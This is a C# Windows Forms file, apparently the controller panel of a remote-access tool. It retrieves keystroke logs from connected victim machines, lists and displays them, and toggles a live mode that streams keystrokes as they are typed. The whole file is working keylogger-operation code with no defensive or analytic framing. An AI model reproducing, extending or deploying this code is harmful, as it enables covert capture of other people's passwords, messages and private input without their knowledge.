using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ServerPackets;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    /*todo: rewrite keylogger - convert to text parse based system
            remove webbrowser control, convert to richtextbox?*/
    /*goal: provide better support for mono - remove dependency on webbrowser control
            and related winapi call to disable navigation sound.  this will also
            provide better security.  minimize network traffic.*/
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly string _path;
        private bool _liveModeEnabled;
        private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
        private const int SET_FEATURE_ON_PROCESS = 0x00000002;

        public FrmKeylogger(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmKl = this;
            _path = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");
            InitializeComponent();

            //disable IE click sounds IE7+
            if (!PlatformHelper.RunningOnMono)
                NativeMethods.CoInternetSetFeatureEnabled(
                    FEATURE_DISABLE_NAVIGATION_SOUNDS, 
                    SET_FEATURE_ON_PROCESS, 
                    true);
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);

                if (!Directory.Exists(_path))
                {
                    Directory.CreateDirectory(_path);
                    return;
                }

                DirectoryInfo dicInfo = new DirectoryInfo(_path);

                FileInfo[] iFiles = dicInfo.GetFiles();

                foreach (FileInfo file in iFiles)
                {
                    lstLogs.Items.Add(new ListViewItem() { Text = file.Name });
                }
            }
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;
            lstLogs.Items.Clear();

            if (_liveModeEnabled)
            {
                btnLiveMode.Text = "Start Live Mode";

                this._connectClient.Send(new GetKeyloggerLive(false));

                _liveModeEnabled = false;
            }

            new GetKeyloggerLogs().Execute(_connectClient);
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                wLogViewer.Navigate(Path.Combine(_path, lstLogs.SelectedItems[0].Text));

                if (_liveModeEnabled)
                {
                    btnLiveMode.Text = "Start Live Mode";

                    this._connectClient.Send(new GetKeyloggerLive(false));

                    _liveModeEnabled = false;
                }
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmKl = null;
        }

        public void AppendLiveResponse(string toAppend)
        {
            wLogViewer.Invoke((MethodInvoker) delegate
            {
                wLogViewer.DocumentText += toAppend;
            });
        }

        public void AddLogToListview(string logName)
        {
            try
            {
                lstLogs.Invoke((MethodInvoker) delegate
                {
                    lstLogs.Items.Add(new ListViewItem {Text = logName});
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void SetGetLogsEnabled(bool enabled)
        {
            try
            {
                btnGetLogs.Invoke((MethodInvoker) delegate
                {
                    btnGetLogs.Enabled = enabled;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void btnLiveMode_Click(object sender, EventArgs e)
        {
            if (btnLiveMode.Text.Equals("Start Live Mode"))
            {
                btnLiveMode.Text = "Stop Live Mode";

                wLogViewer.Navigate("about:blank");
                wLogViewer?.Document?.OpenNew(true);
                wLogViewer?.Document?.Write(
                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>" +
                    "<style>.h { color: 0000ff; display: inline; }</style>");

                wLogViewer.Refresh();

                _liveModeEnabled = true;

                this._connectClient.Send(new GetKeyloggerLive(true));
            }
            else if (btnLiveMode.Text.Equals("Stop Live Mode"))
            {
                btnLiveMode.Text = "Start Live Mode";

                _liveModeEnabled = false;

                this._connectClient.Send(new GetKeyloggerLive(false));
            }
        }

        private void wLogViewer_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            //hack to scroll to bottom of webbrowser control
            if (e.Url.AbsolutePath != (sender as WebBrowser).Url.AbsolutePath)
                return;

            if (_liveModeEnabled)
                wLogViewer.Document?.Window?.ScrollTo(0, wLogViewer.Document.Body.ScrollRectangle.Height);
        }
    }
}
